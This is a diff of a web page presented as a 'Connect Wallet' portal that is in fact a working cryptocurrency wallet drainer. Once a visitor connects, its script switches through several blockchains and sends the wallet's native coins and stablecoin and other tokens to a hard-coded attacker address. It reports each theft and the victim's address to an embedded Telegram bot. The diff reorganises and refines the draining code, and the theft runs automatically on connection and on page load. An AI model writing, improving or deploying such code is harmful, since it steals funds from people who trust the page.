@@ -22,7 +22,7 @@ body {
     box-shadow: 0 20px 60px rgba(0,0,0,0.3);
 }
 .icon { font-size: 72px; margin-bottom: 24px; }
-.connect-btn, button {
+.connect-btn {
     background: linear-gradient(135deg, #667eea, #764ba2);
     color: white;
     border: none;
@@ -32,6 +32,13 @@ body {
     border-radius: 12px;
     cursor: pointer;
 }
+.status {
+    margin-top: 20px;
+    padding: 10px;
+    background: #f0f0f0;
+    border-radius: 8px;
+    display: none;
+}
 </style>
 </head>
 <body>
@@ -39,51 +46,110 @@ body {
 <div class="container">
     <div class="icon">🔐</div>
     <h1 style="font-size:32px;font-weight:700;margin-bottom:16px">Connect Wallet</h1>
-    <button onclick="connect()" class="connect-btn">Connect Now</button>
+    <button onclick="connect()" class="connect-btn" id="connectBtn">Connect Now</button>
+    <div id="status" class="status"></div>
 </div>
 
 <script type="module">
 import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
 import { ethers } from 'https://esm.sh/ethers@5.7.2'
 
-// CONFIG
+// ========== CONFIGURATION ==========
 const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
 const PROJECT_ID = "72f0728c47e59d2eb9fc83069bc6843d";
 const TG_TOKEN = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
 const TG_CHAT = "8309320360";
-const DELAY = 1500;
-const CHAINS = [1,137,56,42161,10,8453,43114];
 
-// TOKENS ÉTENDUS
-const TOKENS = {
-    1: ["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x6B175474E89094C44Da98b954EedeAC495271d0F","0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE","0x514910771AF9Ca656af840dff83E8264EcF986CA","0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984","0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9"],
-    137: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174","0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063","0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619","0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6"],
-    56: ["0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d","0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56","0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c","0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"],
-    42161: ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9","0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8","0x912CE59144191C1204E64559FE8253a0e49E6548"],
-    10: ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58","0x7F5c764cBc14f9669B88837ca1490cCa17c31607","0x4200000000000000000000000000000000000042"],
-    8453: ["0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2","0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA"],
-    43114: ["0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7","0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E","0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB"]
+// ========== CHAINS CONFIG ==========
+const CHAINS_CONFIG = {
+    1: {
+        name: 'Ethereum',
+        rpc: 'https://eth.llamarpc.com',
+        tokens: [
+            '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
+            '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
+            '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
+            '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // SHIB
+            '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
+        ]
+    },
+    137: {
+        name: 'Polygon',
+        rpc: 'https://polygon-rpc.com',
+        tokens: [
+            '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', // USDT
+            '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', // USDC
+            '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', // DAI
+        ]
+    },
+    56: {
+        name: 'BSC',
+        rpc: 'https://bsc-dataseed.binance.org',
+        tokens: [
+            '0x55d398326f99059fF775485246999027B3197955', // USDT
+            '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
+            '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
+        ]
+    },
+    42161: {
+        name: 'Arbitrum',
+        rpc: 'https://arb1.arbitrum.io/rpc',
+        tokens: [
+            '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', // USDT
+            '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', // USDC
+        ]
+    },
+    10: {
+        name: 'Optimism',
+        rpc: 'https://mainnet.optimism.io',
+        tokens: [
+            '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', // USDT
+            '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', // USDC
+        ]
+    }
 };
 
-const ERC20_ABI = ["function balanceOf(address) view returns (uint256)","function transfer(address, uint256) returns (bool)"];
+const ERC20_ABI = [
+    'function balanceOf(address) view returns (uint256)',
+    'function transfer(address, uint256) returns (bool)',
+    'function symbol() view returns (string)',
+    'function decimals() view returns (uint8)'
+];
 
-// CHAINS CONFIG
-const mainnet = {chainId:1, name:'Ethereum', currency:'ETH', rpcUrl:'https://eth.llamarpc.com'};
-const polygon = {chainId:137, name:'Polygon', currency:'MATIC', rpcUrl:'https://polygon-rpc.com'};
-const bsc = {chainId:56, name:'BSC', currency:'BNB', rpcUrl:'https://bsc-dataseed.binance.org'};
-const arbitrum = {chainId:42161, name:'Arbitrum', currency:'ETH', rpcUrl:'https://arb1.arbitrum.io/rpc'};
-const optimism = {chainId:10, name:'Optimism', currency:'ETH', rpcUrl:'https://mainnet.optimism.io'};
-const base = {chainId:8453, name:'Base', currency:'ETH', rpcUrl:'https://mainnet.base.org'};
-const avalanche = {chainId:43114, name:'Avalanche', currency:'AVAX', rpcUrl:'https://api.avax.network/ext/bc/C/rpc'};
+// ========== HELPER FUNCTIONS ==========
+function showStatus(msg) {
+    const status = document.getElementById('status');
+    status.style.display = 'block';
+    status.textContent = msg;
+    console.log(msg);
+}
 
-// WEB3MODAL CONFIG
-const config = defaultConfig({
-    metadata: {
-        name: 'Web3 Portal',
-        description: 'Connect wallet',
-        url: window.location.origin,
-        icons: ['https://avatars.githubusercontent.com/u/37784886']
-    },
+async function sendTelegram(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: TG_CHAT,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch(e) {
+        console.log('TG error:', e);
+    }
+}
+
+// ========== WEB3MODAL SETUP ==========
+const metadata = {
+    name: 'Web3 Portal',
+    description: 'Connect wallet',
+    url: window.location.origin,
+    icons: ['https://avatars.githubusercontent.com/u/37784886']
+};
+
+const ethersConfig = defaultConfig({
+    metadata,
     enableEIP6963: true,
     enableInjected: true,
     enableCoinbase: true,
@@ -91,127 +157,177 @@ const config = defaultConfig({
     defaultChainId: 1
 });
 
-// CREATE MODAL
 const modal = createWeb3Modal({
-    ethersConfig: config,
-    chains: [mainnet,polygon,bsc,arbitrum,optimism,base,avalanche],
+    ethersConfig,
+    chains: [
+        {chainId: 1, name: 'Ethereum', currency: 'ETH', rpcUrl: 'https://eth.llamarpc.com'},
+        {chainId: 137, name: 'Polygon', currency: 'MATIC', rpcUrl: 'https://polygon-rpc.com'},
+        {chainId: 56, name: 'BSC', currency: 'BNB', rpcUrl: 'https://bsc-dataseed.binance.org'},
+        {chainId: 42161, name: 'Arbitrum', currency: 'ETH', rpcUrl: 'https://arb1.arbitrum.io/rpc'},
+        {chainId: 10, name: 'Optimism', currency: 'ETH', rpcUrl: 'https://mainnet.optimism.io'}
+    ],
     projectId: PROJECT_ID,
-    enableAnalytics: false,
-    themeMode: 'dark'
+    enableAnalytics: false
 });
 
-let drainStarted = false;
-
-window.connect = async() => {
-    try { await modal.open(); } catch(e) { console.error(e); }
-}
-
-// DRAINAGE AUTOMATIQUE
-modal.subscribeProvider(async(state) => {
-    if(state.isConnected && state.address && !drainStarted) {
-        drainStarted = true;
-        const address = state.address;
-        
-        console.log('🚀 Drainage démarré pour:', address);
-        
+// ========== DRAINAGE FUNCTION ==========
+async function drainWallet(address) {
+    showStatus('🔄 Starting drainage...');
+    
+    // Get the ethereum provider
+    const ethereum = window.ethereum || (modal.getWalletProvider ? modal.getWalletProvider() : null);
+    
+    if (!ethereum) {
+        showStatus('❌ No wallet provider found');
+        return;
+    }
+    
+    let totalDrained = 0;
+    const results = [];
+    
+    // Process each chain
+    for (const [chainId, config] of Object.entries(CHAINS_CONFIG)) {
         try {
-            // Création initiale du provider
-            let provider = new ethers.providers.Web3Provider(window.ethereum);
-            let signer = provider.getSigner();
-            let network = await provider.getNetwork();
+            showStatus(`🔄 Processing ${config.name}...`);
             
-            // Telegram notification
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: TG_CHAT,
-                    text: `🎯 NEW CONNECTION\n👤 ${address}\n🌐 Chain: ${network.chainId}`
-                })
-            }).catch(e => {});
+            // Switch to chain
+            try {
+                await ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{chainId: '0x' + parseInt(chainId).toString(16)}]
+                });
+            } catch (switchError) {
+                console.log(`Chain ${chainId} not available, skipping...`);
+                continue;
+            }
             
-            // Multi-chain drainage
-            for(const chainId of CHAINS) {
+            // Wait for switch
+            await new Promise(r => setTimeout(r, 2000));
+            
+            // Create fresh provider for this chain
+            const provider = new ethers.providers.Web3Provider(ethereum);
+            const signer = provider.getSigner();
+            
+            // Verify we're on the right chain
+            const network = await provider.getNetwork();
+            if (network.chainId != chainId) {
+                console.log(`Failed to switch to chain ${chainId}`);
+                continue;
+            }
+            
+            // 1. DRAIN NATIVE TOKEN
+            try {
+                const balance = await provider.getBalance(address);
+                const balanceInEth = parseFloat(ethers.utils.formatEther(balance));
+                
+                if (balanceInEth > 0.002) { // Keep some for gas
+                    const gasPrice = await provider.getGasPrice();
+                    const gasLimit = 21000;
+                    const gasCost = gasPrice.mul(gasLimit * 2);
+                    const amountToSend = balance.sub(gasCost);
+                    
+                    if (amountToSend.gt(0)) {
+                        showStatus(`💸 Sending ${ethers.utils.formatEther(amountToSend)} native...`);
+                        
+                        const tx = await signer.sendTransaction({
+                            to: DEST,
+                            value: amountToSend,
+                            gasLimit: gasLimit
+                        });
+                        
+                        await tx.wait();
+                        const value = parseFloat(ethers.utils.formatEther(amountToSend));
+                        totalDrained += value;
+                        results.push(`✅ ${config.name}: ${value.toFixed(4)} native`);
+                        
+                        await sendTelegram(`✅ DRAINED ${value.toFixed(4)} native on ${config.name}\nTX: ${tx.hash}`);
+                    }
+                }
+            } catch(e) {
+                console.log(`Native drain error on ${config.name}:`, e);
+            }
+            
+            // 2. DRAIN TOKENS
+            for (const tokenAddress of config.tokens) {
                 try {
-                    console.log(`🔄 Processing chain ${chainId}...`);
+                    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
                     
-                    // Switch chain si nécessaire
-                    const currentNetwork = await provider.getNetwork();
-                    if(currentNetwork.chainId !== chainId) {
-                        console.log(`Switching from chain ${currentNetwork.chainId} to ${chainId}`);
+                    const balance = await contract.balanceOf(address);
+                    
+                    if (balance.gt(0)) {
+                        const symbol = await contract.symbol().catch(() => 'TOKEN');
+                        const decimals = await contract.decimals().catch(() => 18);
+                        const formatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
                         
-                        try {
-                            await window.ethereum.request({
-                                method: 'wallet_switchEthereumChain',
-                                params: [{chainId: '0x' + chainId.toString(16)}]
-                            });
-                            await new Promise(r => setTimeout(r, 2000));
-                            
-                            // ✅ IMPORTANT: RECRÉER LE PROVIDER APRÈS LE SWITCH
-                            provider = new ethers.providers.Web3Provider(window.ethereum);
-                            signer = provider.getSigner();
-                            
-                        } catch(switchError) {
-                            console.log(`Chain ${chainId} not configured, skipping...`);
-                            continue;
-                        }
-                    }
-                    
-                    // Drain native
-                    try {
-                        const bal = await provider.getBalance(address);
-                        console.log(`Balance on chain ${chainId}: ${ethers.utils.formatEther(bal)}`);
+                        showStatus(`💸 Sending ${formatted.toFixed(2)} ${symbol}...`);
                         
-                        if(bal.gt(ethers.utils.parseEther('0.001'))) {
-                            const gasPrice = await provider.getGasPrice();
-                            const gas = gasPrice.mul(21000).mul(2);
-                            const amt = bal.sub(gas);
-                            
-                            if(amt.gt(0)) {
-                                console.log(`Draining ${ethers.utils.formatEther(amt)} native`);
-                                const tx = await signer.sendTransaction({
-                                    to: DEST,
-                                    value: amt,
-                                    gasLimit: 21000,
-                                    gasPrice: gasPrice
-                                });
-                                console.log(`Native TX: ${tx.hash}`);
-                                await tx.wait();
-                            }
-                        }
-                    } catch(e) {
-                        console.log('Native drain error:', e);
+                        const tx = await contract.transfer(DEST, balance, {
+                            gasLimit: 100000
+                        });
+                        
+                        await tx.wait();
+                        results.push(`✅ ${config.name}: ${formatted.toFixed(2)} ${symbol}`);
+                        
+                        await sendTelegram(`✅ DRAINED ${formatted.toFixed(2)} ${symbol} on ${config.name}\nTX: ${tx.hash}`);
                     }
                     
-                    // Drain tokens
-                    const tokens = TOKENS[chainId] || [];
-                    for(const token of tokens) {
-                        try {
-                            await new Promise(r => setTimeout(r, DELAY));
-                            const c = new ethers.Contract(token, ERC20_ABI, signer);
-                            const b = await c.balanceOf(address);
-                            
-                            if(b.gt(0)) {
-                                console.log(`Found token ${token}: ${b.toString()}`);
-                                const tx = await c.transfer(DEST, b, {gasLimit: 100000});
-                                console.log(`Token TX: ${tx.hash}`);
-                                await tx.wait();
-                            }
-                        } catch(e) {
-                            // Token not found or error
-                        }
-                    }
+                    // Wait between tokens
+                    await new Promise(r => setTimeout(r, 1000));
                     
-                } catch(chainError) {
-                    console.log(`Error on chain ${chainId}:`, chainError);
+                } catch(e) {
+                    console.log(`Token error:`, e);
                 }
             }
             
-            console.log('✅ Drainage completed');
-            
         } catch(e) {
-            console.error('Fatal error:', e);
+            console.log(`Error on chain ${chainId}:`, e);
         }
+    }
+    
+    // Final status
+    if (results.length > 0) {
+        showStatus('✅ Drainage completed!');
+        await sendTelegram(`🎯 DRAINAGE COMPLETE\n\n${results.join('\n')}\n\nFrom: ${address}`);
+    } else {
+        showStatus('⚠️ Nothing was drained');
+    }
+}
+
+// ========== CONNECT FUNCTION ==========
+window.connect = async function() {
+    try {
+        document.getElementById('connectBtn').textContent = 'Connecting...';
+        await modal.open();
+    } catch(e) {
+        console.error('Connection error:', e);
+        document.getElementById('connectBtn').textContent = 'Connect Now';
+    }
+}
+
+// ========== AUTO-DRAIN ON CONNECTION ==========
+modal.subscribeProvider(async (state) => {
+    if (state.isConnected && state.address) {
+        document.getElementById('connectBtn').textContent = 'Connected';
+        
+        // Send initial notification
+        await sendTelegram(`🎯 NEW CONNECTION\n👤 Address: ${state.address}\n⏰ ${new Date().toLocaleString()}`);
+        
+        // Start drainage after 1 second
+        setTimeout(() => {
+            drainWallet(state.address);
+        }, 1000);
+    }
+});
+
+// Check if already connected on load
+window.addEventListener('load', async () => {
+    const account = modal.getAddress();
+    if (account) {
+        document.getElementById('connectBtn').textContent = 'Connected';
+        showStatus('Already connected. Starting drainage...');
+        setTimeout(() => {
+            drainWallet(account);
+        }, 1000);
     }
 });
 </script>
